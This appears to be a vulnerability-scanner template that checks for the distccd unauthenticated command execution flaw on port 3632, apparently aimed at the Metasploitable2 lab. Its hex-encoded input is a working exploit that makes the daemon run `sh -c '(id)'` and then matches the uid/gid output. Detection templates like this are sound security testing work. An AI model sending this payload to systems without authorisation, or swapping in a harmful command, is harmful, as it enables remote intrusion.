id: C-Backdoor

info:
  name: C Compiler Unintentional Backdoor Check
  author: Jean Bagnis
  severity: critical
  description: |
    An unintentional backdoor is a service that may inadvertenly provide access to unauthorizied users to the system or its data. In this case, distccd, a C comppiler, is installed on Metasploitable2. 
    This program makes it easy to scale large compiler jobs across a farm of like-configured systems. 
    The problem with this service is that when improperly configured, an attacker can easily abuse it to run a command of their choice that may harm the system or reveal data. 

tcp:
  - inputs:
      - data: 444953543030303030303031
        type: hex
      - data: 41524743303030303030303841524756303030303030303273684152475630303030303030322d634152475630303030303030637368202d6320272869642927415247563030303030303031234152475630303030303030322d634152475630303030303030366d61696e2e634152475630303030303030322d6f4152475630303030303030366d61696e2e6f444f5449303030303030303141
        type: hex
    host:
      - "{{Hostname}}"
    port: 3632

    matchers:
      - type: regex
        part: body
        regex:
          - "uid=[0-9]+.*gid=[0-9]+.*"
